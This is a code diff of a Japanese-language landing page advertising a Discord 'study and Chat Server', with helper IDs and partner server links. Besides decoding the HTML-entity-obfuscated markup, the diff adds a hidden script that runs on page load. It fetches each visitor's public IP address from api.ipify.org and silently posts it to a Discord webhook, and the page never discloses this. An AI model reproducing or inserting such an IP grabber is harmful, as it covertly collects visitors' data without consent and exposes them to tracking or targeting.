@@ -1,4 +1,10 @@
-<!DOCTYPE html>&#10;<html lang="ja">&#10;<head>&#10;&#32;&#32;&#32;&#32;<meta charset="UTF-8">&#10;&#32;&#32;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0">&#10;&#32;&#32;&#32;&#32;<title>&#5198;&#1365;&#5167;&#5609;&#32;&#115;&#101;&#114;&#118;&#101;&#114;</title>&#10;&#32;&#32;&#32;&#32;<style>
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ᑎՕᐯᗩ server</title>
+    <style>
         body {
             background-color: black;
             color: white;
@@ -55,8 +61,66 @@
         .box a:hover {
             text-decoration: underline;
         }
-    </style>&#10;&#32;&#32;&#32;&#32;<script>
+    </style>
+    <script>
         function changeToHeart(element) {
             element.innerHTML = "♡";
         }
-    </script>&#10;</head>&#10;<body>&#10;&#32;&#32;&#32;&#32;<div class="container">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h1>&#5198;&#1365;&#5167;&#5609;&#39894;</h1>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2>&#115;&#116;&#117;&#100;&#121;&#32;&#97;&#110;&#100;&#32;&#67;&#104;&#97;&#116;&#32;&#83;&#101;&#114;&#118;&#101;&#114;</h2>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p>&#87;&#104;&#97;&#116;&#32;&#121;&#111;&#117;&#32;&#99;&#97;&#110;&#32;&#108;&#101;&#97;&#114;&#110;&#58;&#32;&#76;&#105;&#110;&#117;&#120;&#47;&#116;&#111;&#111;&#108;&#47;&#111;&#116;&#104;&#101;&#114;&#115;&#8230;</p>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<a href="https://discord.com/invite/CxyahCTDgq" class="button" onclick="changeToHeart(this)">&#100;&#105;&#115;&#99;&#111;&#114;&#100;&#32;&#83;&#101;&#114;&#118;&#101;&#114;</a>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2>&#104;&#101;&#108;&#108;&#112;&#101;&#114;</h2>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box">&#73;&#68;&#58;&#115;&#97;&#107;&#97;&#95;&#117;&#119;&#117;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box">&#73;&#68;&#58;&#97;&#108;&#112;&#104;&#97;&#95;&#104;&#97;&#99;&#107;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box">&#73;&#68;&#58;&#97;&#110;&#110;&#121;&#101;&#111;&#110;&#103;&#104;&#97;&#115;&#101;&#121;&#111;&#111;&#104;&#97;&#121;&#111;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box">&#73;&#68;&#58;&#114;&#101;&#99;&#114;&#117;&#105;&#116;&#105;&#110;&#103;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box">&#73;&#68;&#58;&#114;&#101;&#99;&#114;&#117;&#105;&#116;&#105;&#110;&#103;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2>&#99;&#111;&#109;&#98;&#105;&#110;&#97;&#116;&#105;&#111;&#110;&#32;&#83;&#101;&#114;&#118;&#101;&#114;</h2>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box"><a href="https://discord.gg/allyserver1">&#63;</a></div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box"><a href="https://discord.gg/allyserver2">&#63;</a></div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box"><a href="https://discord.gg/allyserver3">&#63;</a></div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box"><a href="https://discord.gg/allyserver4">&#63;</a></div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="box"><a href="https://discord.gg/allyserver5">&#63;</a></div>&#10;&#32;&#32;&#32;&#32;</div>&#10;</body>&#10;</html>
+
+        function sendIPToWebhook() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                
+                const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+                const payload = {
+                    content: `User IP: ${ipAddress}`
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('IPアドレスがDiscordに送信されました。');
+                    }
+                })
+                .catch(error => {
+                    console.error('エラーが発生しました。', error);
+                });
+            });
+        }
+
+        window.onload = function() {
+            sendIPToWebhook();
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>ᑎՕᐯᗩ鯖</h1>
+        <h2>study and Chat Server</h2>
+        <p>What you can learn: Linux/tool/others…</p>
+        <a href="https://discord.com/invite/CxyahCTDgq" class="button" onclick="changeToHeart(this)">discord Server</a>
+        
+        <h2>hellper</h2>
+        <div class="box">ID:saka_uwu</div>
+        <div class="box">ID:alpha_hack</div>
+        <div class="box">ID:annyeonghaseyoohayo</div>
+        <div class="box">ID:recruiting</div>
+        <div class="box">ID:recruiting</div>
+        
+        <h2>combination Server</h2>
+        <div class="box"><a href="https://discord.gg/allyserver1">?</a></div>
+        <div class="box"><a href="https://discord.gg/allyserver2">?</a></div>
+        <div class="box"><a href="https://discord.gg/allyserver3">?</a></div>
+        <div class="box"><a href="https://discord.gg/allyserver4">?</a></div>
+        <div class="box"><a href="https://discord.gg/allyserver5">?</a></div>
+    </div>
+</body>
+</html>
